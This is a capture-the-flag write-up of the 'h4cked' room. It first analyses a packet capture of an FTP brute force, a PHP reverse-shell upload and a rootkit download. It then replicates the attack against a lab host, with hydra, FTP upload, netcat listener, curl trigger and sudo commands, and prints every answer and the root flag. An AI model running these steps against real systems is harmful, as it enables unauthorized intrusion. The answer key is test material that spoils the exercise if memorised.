# h4cked

Find out what happened by analysing a .pcap file and hack your way back into the machine

It seems like our machine got hacked by an anonymous threat actor. However, we are lucky to have a .pcap file from the attack. Can you determine what happened? Download the .pcap file and use Wireshark to view it.

# Task 1 Oh no! We've been hacked!

## The attacker is trying to log into a specific service. What service is this?

Open the pcapng file in Wireshark and go to Statistics > Protocol Hierarchy. It will reveal that the application layer is FTP.

Answer: `FTP`

## There is a very popular tool by Van Hauser which can be used to brute force a series of services. What is the name of this tool?

Answer: `hydra`

## The attacker is trying to log on with a specific username. What is the username?

Right click on the 1st frame and follow the TCP stream to reveal the following content:

~~~
220 Hello FTP World!
USER jenny
331 Please specify the password.
PASS password
530 Login incorrect.
USER jenny
331 Please specify the password.
PASS 666666
530 Login incorrect.
~~~

The attacker keeps brute forcing `jenny`'s account.

Answer: `jenny`

## What is the user's password?

In Wireshark, filter the frames that match the FTP protocol only by entering "FTP" in the search bar. Scroll down until you see "Response: 230 Login successful." (frame #395). Right click on the frame and follow the TCP stream:

~~~
220 Hello FTP World!
USER jenny
331 Please specify the password.
PASS password123
230 Login successful.
SYST
215 UNIX Type: L8
PWD
257 "/var/www/html" is the current directory
PORT 192,168,0,147,225,49
200 PORT command successful. Consider using PASV.
LIST -la
150 Here comes the directory listing.
226 Directory send OK.
TYPE I
200 Switching to Binary mode.
PORT 192,168,0,147,196,163
200 PORT command successful. Consider using PASV.
STOR shell.php
150 Ok to send data.
226 Transfer complete.
SITE CHMOD 777 shell.php
200 SITE CHMOD command ok.
QUIT
221 Goodbye.
~~~

Answer: `password123`

## What is the current FTP working directory after the attacker logged in?

The current working directory is shown in the same stream as above.

Answer: `/var/www/html`

## The attacker uploaded a backdoor. What is the backdoor's filename?

Information still on the same TCP stream.

Answer; `shell.php`

## The backdoor can be downloaded from a specific URL, as it is located inside the uploaded file. What is the full URL?

At the bottom of the TCP stream window, use the arrow to navigate to the other streams and go 2 streams forward (stream #18) to reveal the content of the `shell.php` script. This is a famous PHP reverse shell hosted by pentestmonkey, and going through the comments in the file will reveal the URL where the script is hosted.

Answer: `http://pentestmonkey.net/tools/php-reverse-shell`

## Which command did the attacker manually execute after getting a reverse shell?

Navigate to stream #20 to reveal the below content:

~~~
Linux wir3 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 22:26:54 up  2:21,  1 user,  load average: 0.02, 0.07, 0.08
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
jenny    tty1     -                20:06   37.00s  1.00s  0.14s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ ls -la
total 1529956
drwxr-xr-x  23 root root       4096 Feb  1 19:52 .
drwxr-xr-x  23 root root       4096 Feb  1 19:52 ..
drwxr-xr-x   2 root root       4096 Feb  1 20:11 bin
drwxr-xr-x   3 root root       4096 Feb  1 20:15 boot
drwxr-xr-x  18 root root       3880 Feb  1 20:05 dev
drwxr-xr-x  94 root root       4096 Feb  1 22:23 etc
drwxr-xr-x   3 root root       4096 Feb  1 20:05 home
lrwxrwxrwx   1 root root         34 Feb  1 19:52 initrd.img -> boot/initrd.img-4.15.0-135-generic
lrwxrwxrwx   1 root root         33 Jul 25  2018 initrd.img.old -> boot/initrd.img-4.15.0-29-generic
drwxr-xr-x  22 root root       4096 Feb  1 22:06 lib
drwxr-xr-x   2 root root       4096 Feb  1 20:08 lib64
drwx------   2 root root      16384 Feb  1 19:49 lost+found
drwxr-xr-x   2 root root       4096 Jul 25  2018 media
drwxr-xr-x   2 root root       4096 Jul 25  2018 mnt
drwxr-xr-x   2 root root       4096 Jul 25  2018 opt
dr-xr-xr-x 117 root root          0 Feb  1 20:23 proc
drwx------   3 root root       4096 Feb  1 22:20 root
drwxr-xr-x  29 root root       1040 Feb  1 22:23 run
drwxr-xr-x   2 root root      12288 Feb  1 20:11 sbin
drwxr-xr-x   4 root root       4096 Feb  1 20:06 snap
drwxr-xr-x   3 root root       4096 Feb  1 20:07 srv
-rw-------   1 root root 1566572544 Feb  1 19:52 swap.img
dr-xr-xr-x  13 root root          0 Feb  1 20:05 sys
drwxrwxrwt   2 root root       4096 Feb  1 22:25 tmp
drwxr-xr-x  10 root root       4096 Jul 25  2018 usr
drwxr-xr-x  14 root root       4096 Feb  1 21:54 var
lrwxrwxrwx   1 root root         31 Feb  1 19:52 vmlinuz -> boot/vmlinuz-4.15.0-135-generic
lrwxrwxrwx   1 root root         30 Jul 25  2018 vmlinuz.old -> boot/vmlinuz-4.15.0-29-generic
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@wir3:/$ su jenny
su jenny
Password: password123

jenny@wir3:/$ sudo -l
sudo -l
[sudo] password for jenny: password123

Matching Defaults entries for jenny on wir3:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jenny may run the following commands on wir3:
    (ALL : ALL) ALL
jenny@wir3:/$ sudo su
sudo su
root@wir3:/# whoami
whoami
root
root@wir3:/# cd
cd
root@wir3:~# git clone https://github.com/f0rb1dd3n/Reptile.git
git clone https://github.com/f0rb1dd3n/Reptile.git
Cloning into 'Reptile'...
remote: Enumerating objects: 217, done..[K
remote: Counting objects:   0% (1/217).[K
remote: Counting objects:   1% (3/217).[K
remote: Counting objects:   2% (5/217).[K
remote: Counting objects:   3% (7/217).[K
remote: Counting objects:   4% (9/217).[K
remote: Counting objects:   5% (11/217).[K

[REDACTED]

Resolving deltas:  98% (491/499)   
Resolving deltas:  99% (495/499)   
Resolving deltas: 100% (499/499)   
Resolving deltas: 100% (499/499), done.
root@wir3:~# cd Reptile
cd Reptile
root@wir3:~/Reptile# ls -la
ls -la
total 44
drwxr-xr-x 7 root root 4096 Feb  1 22:27 .
drwx------ 4 root root 4096 Feb  1 22:27 ..
drwxr-xr-x 2 root root 4096 Feb  1 22:27 configs
drwxr-xr-x 8 root root 4096 Feb  1 22:27 .git
-rw-r--r-- 1 root root    8 Feb  1 22:27 .gitignore
-rw-r--r-- 1 root root 1922 Feb  1 22:27 Kconfig
drwxr-xr-x 7 root root 4096 Feb  1 22:27 kernel
-rw-r--r-- 1 root root 1852 Feb  1 22:27 Makefile
-rw-r--r-- 1 root root 2183 Feb  1 22:27 README.md
drwxr-xr-x 4 root root 4096 Feb  1 22:27 scripts
drwxr-xr-x 6 root root 4096 Feb  1 22:27 userland
root@wir3:~/Reptile# make
make
make[1]: Entering directory '/root/Reptile/userland'
Makefile:10: ../.config: No such file or directory
make[1]: *** No rule to make target '../.config'.  Stop.
make[1]: Leaving directory '/root/Reptile/userland'
Makefile:56: recipe for target 'userland_bin' failed
make: *** [userland_bin] Error 2
root@wir3:~/Reptile# 
~~~

The first command that the attacker entered was `whoami`.

## What is the computer's hostname?

This information is revealed in this banner:

~~~
Linux wir3 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
~~~

Answer: `wir3`

## Which command did the attacker execute to spawn a new TTY shell?

Answer: `python3 -c 'import pty; pty.spawn("/bin/bash")'`

## Which command was executed to gain a root shell?

The following lines will answer the question:

~~~
jenny@wir3:/$ sudo su
sudo su
root@wir3:/# whoami
whoami
root
~~~

Answer: `sudo su`

## The attacker downloaded something from GitHub. What is the name of the GitHub project?

The attacker is downloading a content from github:

~~~
root@wir3:~# git clone https://github.com/f0rb1dd3n/Reptile.git
~~~

Answer: `Reptile`

## The project can be used to install a stealthy backdoor on the system. It can be very hard to detect. What is this type of backdoor called?

Answer: `rootkit`

#  Hack your way back into the machine

The attacker has changed the user's password! Can you replicate the attacker's steps and read the flag.txt? The flag is located in the /root/Reptile directory. Remember, you can always look back at the .pcap file if necessary. Good luck!

## Run Hydra (or any similar tool) on the FTP service. The attacker might not have chosen a complex password. You might get lucky if you use a common word list.

First thing is to scan the target. there are 2 open ports, 1 of which is FTP.

~~~
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
~~~

Let's replicate the hydra attack we've analyzed previously:

~~~
kali@kali:/data/hacked/files$ hydra -l jenny -P /usr/share/wordlists/rockyou.txt ftp://10.10.255.63
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-04 07:51:28
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.255.63:21/
[21][ftp] host: 10.10.255.63   login: jenny   password: 987654321
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-04 07:51:53
~~~

Jenny's password is `987654321`

## Change the necessary values inside the web shell and upload it to the webserver

Connect as `jenny`. You'll notice that we have write access to the folder. Download the PHP reverse shell from [pentestmonkey](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) modify the IP and port, and upload it to the server.

~~~
kali@kali:/data/hacked/files$ ftp 10.10.255.63
Connected to 10.10.255.63.
220 Hello FTP World!
Name (10.10.255.63:kali): jenny
331 Please specify the password.
Password: 987654321
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1000     1000         4096 Feb 01 22:26 .
drwxr-xr-x    3 0        0            4096 Feb 01 21:54 ..
-rw-r--r--    1 1000     1000        10918 Feb 01 21:54 index.html
-rwxrwxrwx    1 1000     1000         5493 Feb 01 22:26 shell.php
226 Directory send OK.
ftp> 
~~~

Now, let's upload our reverse shell and give it all privileges:

~~~
ftp> put rev.php 
local: rev.php remote: rev.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5492 bytes sent in 0.00 secs (106.8894 MB/s)
ftp> chmod 777 rev.php
200 SITE CHMOD command ok.
~~~

## Create a listener on the designated port on your attacker machine. Execute the web shell by visiting the .php file on the targeted web server.

Let's start a listener on port 4444 (or whatever port you have specified in the PHP reverse shell).

~~~
kali@kali:/data/hacked/files$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
~~~

And call our reverse shell:

~~~
kali@kali:/data/hacked/files$ curl -s http://10.10.255.63/rev.php
~~~

You should now have a reverse shell.

~~~
kali@kali:/data/hacked/files$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.50.72] from (UNKNOWN) [10.10.255.63] 48734
Linux wir3 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 06:12:03 up 57 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@wir3:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~

## Become root!

Once connected as `www-data`, we want to move laterally to `jenny` using the password found previously (same password as for FTP).

~~~
www-data@wir3:/$ su jenny
Password: 987654321

jenny@wir3:/$ 
~~~

Now, we check jenny's privileges and see that we can become root:

~~~
jenny@wir3:/$ sudo -l
[sudo] password for jenny: 987654321

Matching Defaults entries for jenny on wir3:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jenny may run the following commands on wir3:
    (ALL : ALL) ALL
jenny@wir3:/$ sudo -s
root@wir3:/# 
~~~

## Read the flag.txt file inside the Reptile directory

~~~
root@wir3:/# cd /root
root@wir3:/# ls -la
ls -la
total 20
drwx------  3 root root 4096 Feb  2 10:23 .
drwxr-xr-x 22 root root 4096 Feb  2 10:28 ..
lrwxrwxrwx  1 root root    9 Feb  2 10:20 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwxr-xr-x  7 root root 4096 Feb  2 10:23 Reptile
root@wir3:/# cd Reptile
cd Reptile
root@wir3:/# ls -la
ls -la
total 44
drwxr-xr-x 7 root root 4096 Feb  2 10:23 .
drwx------ 3 root root 4096 Feb  2 10:23 ..
drwxr-xr-x 2 root root 4096 Feb  1 22:27 configs
-rw-r--r-- 1 root root   33 Feb  2 10:23 flag.txt
-rw-r--r-- 1 root root 1922 Feb  1 22:27 Kconfig
drwxr-xr-x 7 root root 4096 Feb  1 22:27 kernel
-rw-r--r-- 1 root root 1852 Feb  1 22:27 Makefile
drwxr-xr-x 2 root root 4096 Feb  1 22:28 output
-rw-r--r-- 1 root root 2183 Feb  1 22:27 README.md
drwxr-xr-x 4 root root 4096 Feb  1 22:27 scripts
drwxr-xr-x 6 root root 4096 Feb  1 22:27 userland
root@wir3:/# cat flag.txt
cat flag.txt
ebcefd66ca4b559d17b440b6e67fd0fd
~~~

Root flag: `ebcefd66ca4b559d17b440b6e67fd0fd`
